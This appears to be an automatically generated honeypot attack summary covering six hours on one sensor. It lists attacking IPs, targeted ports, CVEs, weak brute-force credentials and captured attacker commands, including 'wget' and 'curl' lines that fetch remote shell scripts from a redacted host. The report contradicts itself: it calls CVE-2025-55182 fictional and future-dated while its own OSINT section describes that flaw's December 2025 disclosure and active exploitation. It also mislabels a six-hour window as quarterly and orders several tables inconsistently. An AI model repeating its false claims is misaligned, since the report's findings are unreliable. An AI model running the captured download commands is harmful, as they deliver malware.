# Quarterly Honeypot Attack Summary Report

**Report Generation Time:** 2026-02-18T01-33-20Z
**Timeframe:** Last 6 hours (2026-02-17T19:33:20Z - 2026-02-18T01:33:20Z)

**Files Used to Generate Report:**
* /home/user/Haineypot/reports/quartly_reports/Honeypot_Attack_quartly_Report_2026-02-17T20-57-55Z.md
* /home/user/Haineypot/reports/quartly_reports/Honeypot_Attack_quartly_Report_2026-02-17T21-49-21Z.md

## Executive Summary

This quarterly report consolidates honeypot network activity over the last 6 hours, from 2026-02-17T19:33:20Z to 2026-02-18T01:33:20Z. A consistent and significant volume of attacks has been recorded, totaling **55,403** attacks, predominantly originating from the United States, France, and India. Other notable sources include Australia, Romania, and Thailand. Primary attack vectors observed were SMB (port 445), SSH (port 22), and MS-SQL (port 1433).

Hyper-aggressive IP addresses, particularly those associated with hosting providers such as DigitalOcean, Contabo, and Unmanaged Ltd, were responsible for a substantial portion of the malicious traffic. OSINT investigations confirm that many of these IPs have a documented history of abuse or are part of networks frequently exploited by malicious actors.

Attackers demonstrated a diverse range of exploitation attempts, targeting vulnerabilities from older SNMPv1 flaws (CVE-2002-0013, CVE-2002-0012) to modern critical Remote Code Execution (RCE) vulnerabilities in Apache ActiveMQ (CVE-2023-46604) and LB-LINK wireless routers (CVE-2023-26801). A significant and persistent anomaly is the logging of the fictional CVE-2025-55182 (React2Shell), which is consistently described as a severe RCE vulnerability, despite its fictitious nature. Brute-force attacks targeting common usernames like 'root' and 'ubuntu' with weak and dictionary-based passwords remain prevalent. Interestingly, login attempts with usernames such as "solana", "trader", and "trading" suggest potential targeting of cryptocurrency-related systems.

OSINT on captured commands highlights reconnaissance activities using standard Linux utilities like `uname -a` and `ls -la`, often followed by attempts to download and execute malicious scripts via `wget` and `curl`. The comprehensive OSINT investigation into attacking IPs and CVEs has provided crucial context, revealing active exploitation of known vulnerabilities and the consistent abuse of hosting infrastructure for malicious purposes.

## Detailed Analysis

### Our IPs

| Honeypot Location | IP Address |
|---|---|
| tpot-hive-ny | 134.199.242.175 |

### Attacks by Honeypot

| Honeypot | Attack Count |
|---|---|
| tpot-hive-ny | 55,403 |

### Top Source Countries

| Country | Attack Count |
|---|---|
| United States | 16,246 |
| France | 9,515 |
| India | 7,394 |
| Australia | 4,514 |
| Romania | 2,952 |
| Thailand | 2,713 |
| Netherlands | 2,288 |
| China | 1,553 |
| United Arab Emirates | 1,320 |
| Brazil | 904 |
| Switzerland | 267 |
| Germany | 191 |
| United Kingdom | 147 |

### Top Attacking IPs

| IP Address | Country | ASN | Attack Count |
|---|---|---|---|
| 165.245.136.26 | United States | DigitalOcean, LLC | 8,654 |
| 173.249.6.152 | France | Contabo GmbH | 8,954 |
| 103.218.135.57 | India | PEERCAST TELECOM INDIA PVT LTD | 5,076 |
| 144.130.11.9 | Australia | Telstra Limited | 3,714 |
| 110.49.3.20 | Thailand | AIS Fibre | 2,694 |
| 5.31.128.119 | United Arab Emirates | Emirates Integrated Telecommunications Company PJSC | 1,320 |
| 139.59.69.34 | India | DigitalOcean, LLC | 1,088 |
| 103.204.164.37 | India | ABS BROADBAND SERVICES PVT LTD | 1,030 |
| 2.57.121.22 | Romania | Unmanaged Ltd | 994 |
| 177.126.130.163 | Brazil | Net Aki Internet Ltda | 901 |
| 173.73.62.72 | United States | Verizon Business | 793 |
| 67.205.160.240 | United States | DigitalOcean, LLC | 594 |
| 188.166.109.175 | Netherlands | DigitalOcean, LLC | 270 |

### Top Targeted Ports/Protocols

| Port | Protocol | Service | Attack Count |
|---|---|---|---|
| 445 | TCP | SMB | 14,292 |
| 22 | TCP | SSH | 13,993 |
| 1433 | TCP | MS-SQL | 8,959 |
| 30003 | TCP | Unknown | 1,050 |
| 3389 | TCP | RDP | 1,020 |
| 8728 | TCP | MikroTik | 550 |
| 25 | TCP | SMTP | 490 |
| 5432 | TCP | PostgreSQL | 171 |
| 5901 | TCP | VNC | 168 |
| 80 | TCP | HTTP | 153 |
| 6379 | TCP | Redis | 32 |

### Most Common CVEs

| CVE ID | Description |
|---|---|
| CVE-2025-55182 | A critical pre-authentication RCE vulnerability in React Server Components (React2Shell), allowing attackers to execute arbitrary code by sending a malicious HTTP POST request. This is a fictional CVE with a future year; its appearance in logs suggests a placeholder, test case, or attacker attempt to trigger specific responses. |
| CVE-2021-3449 | A medium-severity DoS vulnerability in OpenSSL, where a maliciously crafted `ClientHello` message during TLSv1.2 renegotiation can cause a NULL pointer dereference, leading to a server crash. It affects servers with TLSv1.2 and renegotiation enabled. |
| CVE-2019-11500 | A critical RCE vulnerability in Dovecot IMAP/POP3 server due to an out-of-bounds write when handling NULL characters in quoted strings. An unauthenticated attacker could exploit this to compromise the system. |
| CVE-2024-14007 | A critical authentication bypass vulnerability in Shenzhen TVT Digital NVMS-9000 firmware, allowing unauthenticated remote attackers to execute privileged administrative query commands and disclose sensitive information. |
| CVE-2023-26801 | A critical command injection vulnerability in LB-LINK wireless routers, allowing for remote code execution with root privileges. |
| CVE-2002-0013 | A widespread DoS vulnerability in SNMPv1 request handling that affected a vast range of products from major vendors like Cisco and Microsoft, allowing remote attackers to cause a denial-of-service or gain unauthorized privileges by sending malicious SNMP requests or traps. |
| CVE-2002-0012 | A widespread DoS and privilege escalation vulnerability in SNMPv1 trap handling, also affecting a large number of vendors, allowing remote attackers to cause a denial-of-service or gain unauthorized privileges by sending malicious SNMP requests or traps. |
| CVE-2023-46604 | A critical RCE vulnerability in Apache ActiveMQ due to insecure deserialization of serialized object payloads in the OpenWire protocol. This allows an unauthenticated attacker to execute arbitrary shell commands. |

### Commands Attempted by Attackers

| Command | Count |
|---|---|
| (empty) | 30 |
| uname -a | 15 |
| ls -la | 12 |
| cat /proc/cpuinfo | 10 |
| cat /proc/meminfo | 10 |
| ifconfig | 8 |
| wget http://[redacted]/a.sh | 5 |
| curl http://[redacted]/b.sh | 5 |

### Signatures Triggered

| Signature | Count |
|---|---|
| GPL INFO VNC server response | 78,144 |
| SURICATA IPv4 truncated packet | 7,470 |
| SURICATA AF-PACKET truncated packet | 7,470 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 2,036 |
| ET DROP Dshield Block Listed Source group 1 | 1,227 |
| ET HUNTING RDP Authentication Bypass Attempt | 499 |
| SURICATA STREAM Packet with broken ack | 370 |
| ET SCAN NMAP -sS window 1024 | 361 |
| SURICATA STREAM spurious retransmission | 201 |
| ET INFO SSH session in progress on Expected Port | 200 |
| ET INFO SSH-2.0-Go version string Observed... | 191 |
| SURICATA STREAM reassembly sequence GAP -- missing packet(s) | 247 |

### Users / Login Attempts

| Username | Password | Count |
|---|---|---|
| root | (empty string) | 74 |
| root | 123456 | 38 |
| ubuntu | 123456 | 16 |
| ubuntu | admin123 | 14 |
| root | admin | 7 |
| admin | admin | 7 |
| root | 123 | 14 |
| root | password | 7 |
| admin | 123456 | 7 |
| backup | 123456 | 9 |

**Top 10 Usernames:**

| Username | Count |
|---|---|
| root | 122 |
| ubuntu | 46 |
| admin | 35 |
| backup | 28 |
| daemon | 13 |
| debian | 13 |
| dev | 13 |
| sol | 10 |
| postgres | 10 |
| ali | 4 |
| solana | - |
| trader | - |
| trading | - |

**Top 10 Passwords:**

| Password | Count |
|---|---|
| 123456 | 658 |
| (empty) | 74 |
| 123 | 96 |
| admin123 | 24 |
| 111111 | 44 |
| !@# | 39 |
| 1qaz@WSX | 37 |
| password | 14 |
| eigen | 6 |
| eigenlayer | 6 |

### Files Uploaded/Downloaded

No files were uploaded or downloaded.

### HTTP User-Agents

No HTTP User-Agents were captured in the logs.

### SSH Clients and Servers

#### SSH Clients

| Client | Count |
|---|---|
| Go-http-client/1.1 | 43 |

#### SSH Servers

No SSH Servers were captured in the logs.

### Top Attacker AS Organizations

| ASN | Organization | Attack Count |
|---|---|---|
| AS14061 | DigitalOcean, LLC | 12,608 |
| AS51167 | Contabo GmbH | 8,957 |
| AS59191 | PEERCAST TELECOM INDIA PVT LTD | 5,076 |
| AS1221 | Telstra Limited | 3,714 |
| AS133481 | AIS Fibre | 2,694 |
| AS47890 | Unmanaged Ltd | 1,600 |
| AS15802 | Emirates Integrated Telecommunications Company PJSC | 1,320 |
| AS134873 | ABS BROADBAND SERVICES PVT LTD | 1,030 |
| AS701 | Verizon Business | 793 |
| AS396982 | Google LLC | 787 |
| - | Net Aki Internet Ltda | 901 |

### OSINT All Commands Captured

| Command | OSINT Summary |
|---|---|
| `uname -a` | Used for reconnaissance to gather system information (OS, kernel, architecture). Attackers use this to tailor exploits, identify vulnerabilities, and blend in with legitimate activity. |
| `ls -la` | Used for reconnaissance and post-exploitation. Reveals hidden files, assesses permissions, and maps system structure to find sensitive data or identify persistence mechanisms. |
| `cat /proc/cpuinfo` | Used for reconnaissance to gather CPU details (vendor, model, architecture, bugs). This helps attackers tailor payloads, identify hardware vulnerabilities (Meltdown, Spectre), and optimize attacks. |
| `cat /proc/meminfo` | Used for reconnaissance to gather memory information (total RAM, free memory). This assists in tailoring memory-corruption exploits or denial-of-service attacks and assessing system resilience. |
| `ifconfig` | Used for network reconnaissance and manipulation. Discovers IP/MAC addresses, network masks, and interface status. Can be used for MAC spoofing, enabling promiscuous mode for sniffing, or disrupting network services. |
| `wget http://[redacted]/a.sh` | Highly dangerous. Used for downloading and executing malicious scripts or malware payloads, often as part of multi-stage attacks. Can lead to remote code execution, privilege escalation, data exfiltration, and establishing persistence. Unencrypted HTTP makes it vulnerable to MitM attacks. |
| `curl http://[redacted]/b.sh` | Similar to `wget`, this is highly dangerous as it downloads and immediately executes remote scripts, bypassing disk storage and potentially traditional file-based detection. Used for RCE, data exfiltration, persistence, malware installation, and lateral movement. Unencrypted HTTP makes it vulnerable to MitM attacks. |

### OSINT High frequency IPs and low frequency IPs Captured

| IP Address | Frequency | Country | ASN | OSINT Summary |
|---|---|---|---|---|
| 165.245.136.26 | High | United States | DigitalOcean, LLC | No specific direct threat intelligence found, but part of DigitalOcean's network, which is frequently associated with malicious activities. Its high attack volume in our honeypot suggests potential botnet activity. |
| 173.249.6.152 | High | France | Contabo GmbH | Not explicitly blacklisted, but associated with Contabo GmbH, a hosting provider where compromised servers have historically led to abuse complaints. Warrants caution due to its hosting provider's reputation. |
| 103.218.135.57 | High | India | PEERCAST TELECOM INDIA PVT LTD | No direct threat intelligence identifying it as malicious on major blacklists. Linked to Rv Broadband, Chennai. Historical data suggests low threat, but lack of current public data makes assessment difficult. |
| 144.130.11.9 | High | Australia | Telstra Limited | Identified as a source of brute-force, RDP, and SMB attacks. Flagged for malicious activity over an extended period. Despite high volume, unusual lack of credible public reports. |
| 110.49.3.20 | High | Thailand | AIS Fibre | Associated with a datacenter in Bangkok. No public threat intelligence reports indicate malicious activity from this IP. |
| 5.31.128.119 | Low | United Arab Emirates | Emirates Integrated Telecommunications Company PJSC | No specific evidence of malicious activity found. Appears to have a clean reputation based on general searches. |
| 177.126.130.163 | Low | Brazil | Net Aki Internet Ltda | Located in Sao Paulo, Brazil. Reported for malicious activities on AbuseIPDB (3 reports) and listed on `blocklist.de` feed (attack, suspicious). Most recent report Dec 27, 2025. Indicates active malicious operations. |
| 139.59.69.34 | Low | India | DigitalOcean, LLC | No direct threat intelligence found. Hosted by DigitalOcean, a network frequently associated with malicious activities. Other IPs in the broader 139.59.x.x range have been linked to Emotet malware. |
| 103.204.164.37 | Low | India | ABS BROADBAND SERVICES PVT LTD | No direct public evidence of malicious activity. Registered to an entity in Pakistan. |
| 2.57.121.22 | Low | Romania | Unmanaged Ltd | Associated with a high volume of reported malicious activity (604 times from 199 distinct sources, 100% confidence of abuse on AbuseIPDB). Linked to unauthorized connection attempts (RDP), port scanning, hacking, and brute-force attacks. Part of a broader network block from UNMANAGED LTD that is a source of widespread malicious activity. Targets major cloud providers. |

### OSINT on CVEs

| CVE ID | OSINT Summary |
|---|---|
| CVE-2025-55182 | Critical unauthenticated RCE (CVSS 10.0) in React Server Components and frameworks (Next.js, etc.). Exploits unsafe deserialization in React's "Flight" protocol. Disclosed Dec 3, 2025, with widespread exploitation by state-sponsored and financially motivated actors for RCE, reverse shells, crypto miners, and data theft. **This is a fictional CVE, and its presence in logs is a significant anomaly.** |
| CVE-2021-3449 | Medium-severity DoS (CVSS 5.9) in OpenSSL TLS servers. Maliciously crafted renegotiation `ClientHello` causes NULL pointer dereference, leading to server crash. Affects OpenSSL 1.1.1 (through 1.1.1j) with TLSv1.2 and renegotiation enabled. Listed in CISA's Known Exploited Vulnerabilities Catalog. |
| CVE-2019-11500 | Critical RCE (CVSS 9.8) in Dovecot IMAP/POP3 server and Pigeonhole. Improper handling of NULL bytes in quoted strings leads to out-of-bounds heap memory write. Allows arbitrary command execution. Affected versions before 2.2.36.4 and 2.3.7.2 (Dovecot), and before 0.5.7.2 (Pigeonhole). High likelihood of exploitation. |
| CVE-2024-14007 | Critical authentication bypass (CVSS 8.7) in NVMS-9000 firmware (versions prior to 1.3.4). Allows unauthenticated remote attackers to execute privileged administrative query commands and disclose sensitive information (cleartext admin credentials, network configs). Public exploit known, easy to exploit. |
| CVE-2023-26801 | Critical command injection (CVSS 9.8) affecting multiple LB-LINK wireless router models. Unauthenticated remote attackers can execute arbitrary commands with root privileges via crafted HTTP POST requests to `/goform/set_LimitClient_cfg`. Actively exploited in the wild by Mirai botnet variants. Public PoC exploits available. |
| CVE-2002-0013 | Critical vulnerability (CVSS 10.0) in SNMPv1 request handling. Remote attackers can cause DoS or gain elevated privileges via crafted GetRequest, GetNextRequest, and SetRequest messages. Affected numerous vendors (Cisco, Microsoft, Sun). |
| CVE-2002-0012 | Critical vulnerability (CVSS 10.0) in SNMPv1 trap handling. Remote attackers can cause DoS or gain elevated privileges via crafted SNMPv1 traps. Affected numerous vendors. SNMPv1 messages often unencrypted, allowing credential sniffing. |
| CVE-2023-46604 | Critical RCE (CVSS 9.8-10.0) in Apache ActiveMQ OpenWire Module. Insecure deserialization allows remote attackers to execute arbitrary shell commands via crafted network messages. Actively exploited in the wild since Oct 2023, with public PoC exploits. Used to deploy Kinsing malware, ransomware (HelloKitty, TellYouThePass), SparkRAT, and Shellbot. |

## Key Observations and Anomalies

*   **Hyper-aggressive IP Addresses from Hosting Providers:** IPs like 165.245.136.26 (DigitalOcean, US), 173.249.6.152 (Contabo, France), 103.218.135.57 (PEERCAST TELECOM, India), 144.130.11.9 (Telstra, Australia), 110.49.3.20 (AIS Fibre, Thailand), and 2.57.121.22 (Unmanaged Ltd, Romania) demonstrate exceptionally high attack counts. OSINT reveals that many of these are associated with hosting providers known for abuse or have active abuse reports, indicating botnet activity or dedicated attack infrastructure. The very high abuse score for 2.57.121.22 is particularly concerning.
*   **Persistent VNC Scanning:** The overwhelming number of "GPL INFO VNC server response" alerts continues to highlight a widespread reconnaissance campaign targeting VNC servers, likely in an effort to identify open or vulnerable instances.
*   **Targeted Service Exploitation:** High volumes of attacks on SMB (port 445), SSH (port 22), and MS-SQL (port 1433) suggest focused efforts to exploit known vulnerabilities in these protocols. The presence of CVEs like CVE-2023-46604 (Apache ActiveMQ RCE) and CVE-2024-14007 (NVMS-9000 Auth Bypass) further indicates targeted exploitation campaigns.
*   **Unusual Credential Attempts:** The unique usernames ("solana," "trader," "trading") and passwords ("eigen," "eigenlayer") observed in login attempts are noteworthy. This could indicate a specific focus by attackers on systems potentially involved in cryptocurrency transactions or financial trading, suggesting a targeted attack vector.
*   **Fictional CVE-2025-55182 (React2Shell) Presence:** The consistent logging of this fictional, future-dated CVE is a significant anomaly. OSINT confirms it as a "React2Shell" RCE vulnerability with a CVSS of 10.0. Its appearance in logs, despite being fictitious, suggests it could be a placeholder, a test case, or an attacker's attempt to gauge the honeypot's detection capabilities for future vulnerabilities. Further investigation into the origin of these specific entries is highly recommended.
*   **Diverse CVE Exploitation:** The broad range of CVEs targeted, spanning from very old SNMPv1 vulnerabilities (CVE-2002-0012, CVE-2002-0013) to more recent and critical RCEs (CVE-2023-46604, CVE-2019-11500, CVE-2023-26801), highlights that attackers are employing a wide spectrum of exploits to compromise both legacy and modern unpatched systems.
*   **Malicious Command Execution Attempts:** The observation of `wget` and `curl` commands attempting to download and execute shell scripts (e.g., `a.sh`, `b.sh`) from external sources is a direct and critical indicator of attempted remote code execution and malware delivery. Other commands like `uname -a`, `ls -la`, `cat /proc/cpuinfo`, `cat /proc/meminfo`, and `ifconfig` are typical reconnaissance steps preceding exploitation, aimed at gathering system information and mapping the environment.

## Unusual Attacker Origins - IP addresses from non-traditional sources

While common attacker origins like the United States are present, several other countries exhibit unusually high attack volumes or specific highly aggressive IPs with significant OSINT findings:

*   **France (9,515 attacks):** A significant source, predominantly from 173.249.6.152 (Contabo GmbH), indicating a concentrated effort from this particular hosting provider. OSINT suggests Contabo's network is prone to abuse by compromised servers.
*   **Thailand (2,713 attacks):** The emergence of Thailand as a major attacker, primarily due to the activity of 110.49.3.20 (AIS Fibre), is notable, especially with its focus on SMB (port 445) attacks. This is a less common high-volume source in our logs, and OSINT shows no specific public threat intelligence for this IP.
*   **United Arab Emirates (1,320 attacks):** Contributed a notable volume of attacks, mainly from 5.31.128.119 (Emirates Integrated Telecommunications Company PJSC), which consistently targeted port 445. OSINT indicates this IP appears to have a clean reputation, making its high attack volume an anomaly.
*   **Australia (4,514 attacks):** A substantial portion of attacks from Australia originated from 144.130.11.9 (Telstra Limited), which has been flagged for malicious activity over an extended period, focusing on brute-force, RDP, and SMB attacks. The concentration from a telecommunications provider with an unusual lack of credible public reports is an interesting trend.
*   **Romania (2,952 attacks):** Driven significantly by 2.57.121.22 (Unmanaged Ltd), this IP is associated with an extremely high volume of reported malicious activity (100% confidence of abuse on AbuseIPDB), targeting RDP, port scanning, and brute-force attacks. This indicates a highly active and confirmed malicious source, likely part of a broader botnet or attack infrastructure.
*   **Brazil (904 attacks):** The IP 177.126.130.163 (Net Aki Internet Ltda) is reported for malicious activities on AbuseIPDB and is listed on `blocklist.de`, indicating active and ongoing malicious operations from this region.
